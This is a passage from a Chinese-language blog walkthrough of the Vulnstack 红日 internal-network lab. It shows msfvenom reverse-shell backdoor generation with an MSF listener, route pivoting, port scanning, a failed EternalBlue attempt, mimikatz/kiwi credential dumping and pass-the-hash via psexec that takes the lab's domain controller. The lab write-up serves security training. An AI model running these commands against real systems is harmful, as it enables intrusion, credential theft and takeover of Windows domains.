<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230317094926858-442077730.png"></p>
<p>如果MSF 中有Win7 的 Shell，只需要返回会话并执行命令<code>run post/windows/manage/enable_rdp</code>即可开启靶机的远程桌面</p>
<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="&lt;4&gt; 内网渗透"></a>&lt;4&gt; 内网渗透</h1><h2 id="1-CS派生会话给MSF"><a href="#1-CS派生会话给MSF" class="headerlink" title="(1)CS派生会话给MSF"></a>(1)CS派生会话给MSF</h2><h3 id="1、MSF开启监听"><a href="#1、MSF开启监听" class="headerlink" title="1、MSF开启监听"></a>1、MSF开启监听</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole <span class="comment"># 启动MSF框架</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.236.128</span><br><span class="line"><span class="built_in">set</span> lport 1111</span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316173225653-130142013.png"></p>
<h3 id="2、CS派生会话"><a href="#2、CS派生会话" class="headerlink" title="2、CS派生会话"></a>2、CS派生会话</h3><p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316174545046-1279641808.png"></p>
<p>案例 choose之后，我们的msf那边就可以收到一个session会话(但是没有)</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230317083434210-552183840.png"></p>
<p>CS执行失败，这里我们换一种方法  采用质朴的方法反弹 win7的shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.236.128  LPORT=1111 -f exe -o shell.exe <span class="comment">#kali里生成msf后门文件 shell.exe</span></span><br><span class="line">蚁剑上传到 win7上 </span><br><span class="line">kali里运行监听</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.236.128</span><br><span class="line"><span class="built_in">set</span> lport 1111</span><br><span class="line">exploit </span><br><span class="line"></span><br><span class="line">蚁剑运行 shell.exe 得到meterpreter</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316181022410-1602985645.png"></p>
<h3 id="3、MSF-简单利用"><a href="#3、MSF-简单利用" class="headerlink" title="3、MSF 简单利用"></a>3、MSF 简单利用</h3><p>获得 MSF 的会话后即可使用 MSF 集成的诸多强大功能模块和脚本。简单演示下，如调用<code>post/windows/gather/checkvm</code>判断靶机是否属于虚拟机（检查是否进入了蜜罐）：</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316181226906-1321201512.png"></p>
<p>再如调用 <code>post/windows/gather/enum_applications</code>模块枚举列出安装在靶机上的应用程序：</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316181259554-1092010937.png"></p>
<h3 id="4、添加路由"><a href="#4、添加路由" class="headerlink" title="4、添加路由"></a>4、添加路由</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以用模块自动添加路由</span></span><br><span class="line">run post/multi/manage/autoroute</span><br><span class="line"><span class="comment">#添加一条路由</span></span><br><span class="line">run autoroute -s 192.168.52.0/24</span><br><span class="line"><span class="comment">#查看路由添加情况</span></span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>

<h3 id="5、内网端口扫描"><a href="#5、内网端口扫描" class="headerlink" title="5、内网端口扫描"></a>5、内网端口扫描</h3><p>先执行background 命令将当前执行的 Meterpreter 会话切换到后台（后续也可执行sessions -i 重新返回会话），然后使用 MSF 自带 auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp 模块扫描内网域成员主机 192.168.52.141 开放的端口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.52.141</span><br><span class="line"><span class="built_in">set</span> ports 80,135-139,445,3306,3389</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316195846234-826611618.png"></p>
<p>192.168.52.141 win2003域成员机开启了 135、139、445端口</p>
<p>同理扫描一下域控机子 </p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316200115555-2063206.png"></p>
<p>域控开启了80、135、139、445端口</p>
<h2 id="2-MSF进行ms17-010攻击-未成功"><a href="#2-MSF进行ms17-010攻击-未成功" class="headerlink" title="(2)MSF进行ms17-010攻击(未成功)"></a>(2)MSF进行ms17-010攻击(未成功)</h2><h3 id="1、msf扫描模块探测是否存在ms17-010漏洞"><a href="#1、msf扫描模块探测是否存在ms17-010漏洞" class="headerlink" title="1、msf扫描模块探测是否存在ms17-010漏洞"></a>1、msf扫描模块探测是否存在ms17-010漏洞</h3><p>对于开启了 445 端口的 Windows 服务器肯定是要进行一波永恒之蓝扫描尝试的，借助 MSF 自带的漏洞扫描模块进行扫描：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search ms17_010</span><br><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316201714462-967954062.png"></p>
<p>一测 域控和成员机可能都存在ms17-010漏洞<br>2、漏洞利用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp <span class="comment">#内网环境，需要正向shell连接</span></span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.52.138</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316202702006-1037964138.png"></p>
<p>并没有拿到shell，看师傅的博客说好像通过 ms17-010直接拿到shell的情况并不多，成功率不高</p>
<h2 id="3-哈希传递攻击-PTH-拿下域控"><a href="#3-哈希传递攻击-PTH-拿下域控" class="headerlink" title="(3) 哈希传递攻击(PTH)拿下域控"></a>(3) 哈希传递攻击(PTH)拿下域控</h2><p>上面既然通过永恒之蓝漏洞难以获得域控主机的 Shell，那就换一种攻击思路拿下域控吧，下面演示的是通过哈希传递攻击 PTH 拿下域控主机。</p>
<p><strong>【哈希传递攻击】在 kerberos、NTLM 认证过程的关键，首先就是基于用户密码 Hash 的加密，所以在域渗透中，无法破解用户密码 Hash 的情况下，也可以直接利用 Hash 来完成认证，达到攻击的目的，这就是 hash 传递攻击（Pass The Hash，简称 PTH）。如果内网主机的本地管理员账户密码相同，那么可以通过 PTH 远程登录到任意一台主机，操作简单、威力无穷。</strong></p>
<p>在域环境中，利用哈希传递攻击的渗透方式往往是这样的：</p>
<ol>
<li>获得一台域主机的权限，Dump 内存获得该主机的用户密码 Hash 值；</li>
<li>通过哈希传递攻击尝试登录其他主机；</li>
<li>继续搜集 Hash 并尝试远程登录，直到获得域管理员账户 Hash，登录域控，最终成功控制整个域。</li>
</ol>
<p>下面使用 Metasploit&#x2F;CS 来进行本靶场环境的进行 PTH 攻击演示：</p>
<h3 id="1、CS哈希传递攻击利用"><a href="#1、CS哈希传递攻击利用" class="headerlink" title="1、CS哈希传递攻击利用"></a>1、CS哈希传递攻击利用</h3><p>前面我们也有提到过，在win7 上线CS时，我们可以右键会话 -&gt;执行 -&gt; Run Mimikatz<br>直接借助 CS 进行用户哈希凭证窃取</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230317081913071-1261719240.png"></p>
<p>这里抓取到用户哈希凭证之后，我们执行 net view 发现了域内另外俩台机器点击这里可以看到</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316164731295-1003420215.png"></p>
<p>可以利用抓取到的密码 psexec 利用域管理员账户 Hash login一下 监听器选 windows_smb&#x2F;bind_pipe</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316164822903-1528659583.png"></p>
<p>拿到正向会话(前面三层内网靶机有讲正向反向)之后，我们可以右键 目标-&gt;文件管理</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316164517415-1798252375.png"></p>
<p>可以看到域控的文件 我们可以进行上传文件操作，拿下域控</p>
<h3 id="2、MSF哈希传递攻击"><a href="#2、MSF哈希传递攻击" class="headerlink" title="2、MSF哈希传递攻击"></a>2、MSF哈希传递攻击</h3><p><code>run windows/gather/smart_hashdump</code> 来进行hashdump</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230316212756885-1839789078.png"></p>
<p>需要SYSTEM权限，我们直接getsystem  发现可以正常提权<br>提到SYSTEM权限之后再执行 <code>run windows/gather/smart_hashdump</code></p>
<p>得到管理员的密码的hash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+] 	liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>

<p>但是这个只是用户密码的一个hash值，我们在msf里加载mimikatz模块<br>ps：ms6中 mimikatz模块已经合并为kiwi模块</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line"></span><br><span class="line">creds_all  <span class="comment">#列举所有凭据</span></span><br><span class="line">creds_kerberos  <span class="comment">#列举所有kerberos凭据</span></span><br><span class="line">creds_msv  <span class="comment">#列举所有msv凭据</span></span><br><span class="line">creds_ssp  <span class="comment">#列举所有ssp凭据</span></span><br><span class="line">creds_tspkg  <span class="comment">#列举所有tspkg凭据</span></span><br><span class="line">creds_wdigest  <span class="comment">#列举所有wdigest凭据</span></span><br><span class="line">dcsync  <span class="comment">#通过DCSync检索用户帐户信息</span></span><br><span class="line">dcsync_ntlm  <span class="comment">#通过DCSync检索用户帐户NTLM散列、SID和RID</span></span><br><span class="line">golden_ticket_create  <span class="comment">#创建黄金票据</span></span><br><span class="line">kerberos_ticket_list  <span class="comment">#列举kerberos票据</span></span><br><span class="line">kerberos_ticket_purge  <span class="comment">#清除kerberos票据</span></span><br><span class="line">kerberos_ticket_use  <span class="comment">#使用kerberos票据</span></span><br><span class="line">kiwi_cmd  <span class="comment">#执行mimikatz的命令，后面接mimikatz.exe的命令</span></span><br><span class="line">lsa_dump_sam  <span class="comment">#dump出lsa的SAM</span></span><br><span class="line">lsa_dump_secrets  <span class="comment">#dump出lsa的密文</span></span><br><span class="line">password_change  <span class="comment">#修改密码</span></span><br><span class="line">wifi_list  <span class="comment">#列出当前用户的wifi配置文件</span></span><br><span class="line">wifi_list_shared  <span class="comment">#列出共享wifi配置文件/编码</span></span><br></pre></td></tr></table></figure>
<p>抓取一下用户哈希凭证，报错说 mimikatz在x64用不了。。。 不知道怎么解决 卡住了</p>
<p>后面第二天 CS秃然就可以用了(用着用着beacon就又exit了 不知道为啥) </p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230317081913071-1261719240.png"></p>
<p>获得 NTLM Hash：4f1a2b2cf1dd79ae22a7f198412d7e51，在 Metasploit 中，经常使用于哈希传递攻击的模块有：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/admin/smb/psexec_command   <span class="comment">#在目标机器上执行系统命令</span></span><br><span class="line">exploit/windows/smb/psexec           <span class="comment">#用psexec执行系统命令</span></span><br><span class="line">exploit/windows/smb/psexec_psh       <span class="comment">#使用powershell作为payload</span></span><br></pre></td></tr></table></figure>

<p>以exploit&#x2F;windows&#x2F;smb&#x2F;psexec模块哈希传递攻击 Windows Server 2008 为例：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.52.138</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass 00000000000000000000000000000000:4f1a2b2cf1dd79ae22a7f198412d7e51</span><br><span class="line"><span class="built_in">set</span> smbdomain god</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>但是 time out…… 没通<br>CS里通过 PTH  psexec成功拿下域控</p>
<p><img src="/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/3074366-20230317093025411-81491533.png"></p>
<p>参考链接：<br><a href>https://blog.csdn.net/weixin_39190897&#x2F;article&#x2F;details&#x2F;118353886?ops_request_misc&#x3D;%257B%2522request%255Fid%2522%253A%2522167602673016800182163716%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id&#x3D;167602673016800182163716&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2<del>all</del>sobaiduend~default-2-118353886-null-null.142^v73^wechat,201^v4^add_ask,239^v1^insert_chatgpt&amp;utm_term&#x3D;%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA&amp;spm&#x3D;1018.2226.3001.4449</a></p>
<p><a href>https://bwshen.blog.csdn.net/article/details/118338328</a></p>
<p><a href>https://blog.csdn.net/qq_38626043&#x2F;article&#x2F;details&#x2F;109388147</a></p>
</div><div class="article-licensing box"><div class="licensing-title"><p>Vulnstack-红日安全内网靶场[一]</p><p><a href="https://1vxyz.github.io/2023/09/20/Vulnstack-红日安全内网靶场-一/">https://1vxyz.github.io/2023/09/20/Vulnstack-红日安全内网靶场-一/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>1vxyz</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2023-09-20</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2023-10-14</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/">内网靶场</a></div><!--!--></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons is-centered"><a class="button donate" data-type="alipay"><span class="icon is-small"><i class="fab fa-alipay"></i></span><span>支付宝</span><span class="qrcode"><img src="/img/alipay.jpg" alt="支付宝"></span></a><a class="button donate" data-type="wechat"><span class="icon is-small"><i class="fab fa-weixin"></i></span><span>微信</span><span class="qrcode"><img src="/img/wechat.jpg" alt="微信"></span></a></div></div></div><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">春秋云镜-Brute4Road靶场</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2023/09/20/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA-%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%B8%97%E9%80%8F/"><span class="level-item">CFS三层靶机-内网环境渗透</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">评论</h3><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div><script>var disqus_config = function () {
            this.page.url = 'https://1vxyz.github.io/2023/09/20/Vulnstack-%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA-%E4%B8%80/';
            this.page.identifier = '2023/09/20/Vulnstack-红日安全内网靶场-一/';
        };
        (function() {
            var d = document, s = d.createElement('script');  
            s.src = '//' + 'shortname' + '.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();</script></div></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-10-10T02:04:20.000Z">2023-10-10</time></p><p class="title"><a href="/2023/10/10/%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2/">免杀初探</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-10-06T13:16:47.000Z">2023-10-06</time></p><p class="title"><a href="/2023/10/06/Kerberos%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/">Kerberos协议漏洞攻击</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-10-05T09:08:10.000Z">2023-10-05</time></p><p class="title"><a href="/2023/10/05/Kerberos%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/">Kerberos认证学习</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-09-25T07:56:19.000Z">2023-09-25</time></p><p class="title"><a href="/2023/09/25/%E7%AC%AC%E4%BA%8C%E7%AB%A0-Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE/">第二章-Windows认证机制和协议</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2023-09-20T12:02:57.000Z">2023-09-20</time></p><p class="title"><a href="/2023/09/20/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road%E9%9D%B6%E5%9C%BA/">春秋云镜-Brute4Road靶场</a></p></div></article></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><span class="level-start"><span class="level-item">内网渗透</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/CTF%E6%AF%94%E8%B5%9Bwp/"><span class="tag">CTF比赛wp</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/java%E5%AE%89%E5%85%A8/"><span class="tag">java安全</span><span class="tag">11</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%85%8D%E6%9D%80/"><span class="tag">免杀</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><span class="tag">内网渗透</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/"><span class="tag">内网靶场</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%B7%A5%E5%85%B7/"><span class="tag">工具</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%8F%90%E6%9D%83/"><span class="tag">提权</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span class="tag">漏洞复现</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"><span class="tag">环境配置</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"><span class="tag">电子取证</span><span class="tag">1</span></a></div></div></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://www.cnblogs.com/BUTLER/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">BUTLER</span></span><span class="level-right"><span class="level-item tag">www.cnblogs.com</span></span></a></li><li><a class="level is-mobile" href="http://cxkjy.github.io/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">帅哥</span></span><span class="level-right"><span class="level-item tag">cxkjy.github.io</span></span></a></li><li><a class="level is-mobile" href="https://blog.csdn.net/weixin_61154173?type=blog" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">zxkling</span></span><span class="level-right"><span class="level-item tag">blog.csdn.net</span></span></a></li><li><a class="level is-mobile" href="https://v2ish1yan.github.io/" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">v2ish1yan</span></span><span class="level-right"><span class="level-item tag">v2ish1yan.github.io</span></span></a></li><li><a class="level is-mobile" href="https://blog.csdn.net/weixin_63231007?type=blog" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">CSDN</span></span><span class="level-right"><span class="level-item tag">blog.csdn.net</span></span></a></li></ul></div></div></div><div class="column-right-shadow is-hidden-widescreen is-sticky"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3 is-sticky"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/fufu.gif" alt="1vxyz"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">1vxyz</p><p class="is-size-6 is-block">什么都想学 什么都学不会</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>China</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">24</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">1</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">10</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/1vxyz" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/1vxyz"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" id="toc" data-type="toc"><div class="card-content"><div class="menu"><h3 class="menu-label">目录</h3><ul class="menu-list"><li><a class="level is-mobile" href="#环境搭建"><span class="level-left"><span class="level-item">1</span><span class="level-item">&lt;1&gt; 环境搭建</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#1-配置Win7-web服务器网络"><span class="level-left"><span class="level-item">1.1</span><span class="level-item">(1) 配置Win7 web服务器网络</span></span></a></li><li><a class="level is-mobile" href="#2-配置-Winserver-2008网络-DC域控"><span class="level-left"><span class="level-item">1.2</span><span class="level-item">(2) 配置 Winserver 2008网络(DC域控)</span></span></a></li><li><a class="level is-mobile" href="#3-配置-Win2003-win2k3网络-域成员"><span class="level-left"><span class="level-item">1.3</span><span class="level-item">(3) 配置 Win2003/win2k3网络(域成员)</span></span></a></li></ul></li><li><a class="level is-mobile" href="#外网边界突破"><span class="level-left"><span class="level-item">2</span><span class="level-item">&lt;2&gt; 外网边界突破</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#1-信息收集-弱口令-开放了phpmyadmin、yxcms"><span class="level-left"><span class="level-item">2.1</span><span class="level-item">(1) 信息收集(弱口令+开放了phpmyadmin、yxcms)</span></span></a></li><li><a class="level is-mobile" href="#2-PhpMyAdmin-后台-Getshell"><span class="level-left"><span class="level-item">2.2</span><span class="level-item">(2) PhpMyAdmin 后台 Getshell</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#尝试into-outfile导出木马（失败）"><span class="level-left"><span class="level-item">2.2.1</span><span class="level-item">-尝试into outfile导出木马（失败）</span></span></a></li><li><a class="level is-mobile" href="#利用Mysql日志文件写入shell"><span class="level-left"><span class="level-item">2.2.2</span><span class="level-item">-利用Mysql日志文件写入shell</span></span></a></li></ul></li><li><a class="level is-mobile" href="#3-yxcms后台上传getshell"><span class="level-left"><span class="level-item">2.3</span><span class="level-item">(3)yxcms后台上传getshell</span></span></a></li></ul></li><li><a class="level is-mobile" href="#内网信息探测"><span class="level-left"><span class="level-item">3</span><span class="level-item">&lt;3&gt; 内网信息探测</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#1-靶机上线CS"><span class="level-left"><span class="level-item">3.1</span><span class="level-item">(1) 靶机上线CS</span></span></a></li><li><a class="level is-mobile" href="#2-域内信息收集"><span class="level-left"><span class="level-item">3.2</span><span class="level-item">(2) 域内信息收集</span></span></a></li><li><a class="level is-mobile" href="#3-rdp远程登陆win7"><span class="level-left"><span class="level-item">3.3</span><span class="level-item">(3) rdp远程登陆win7</span></span></a></li></ul></li><li><a class="level is-mobile" href="#内网渗透"><span class="level-left"><span class="level-item">4</span><span class="level-item">&lt;4&gt; 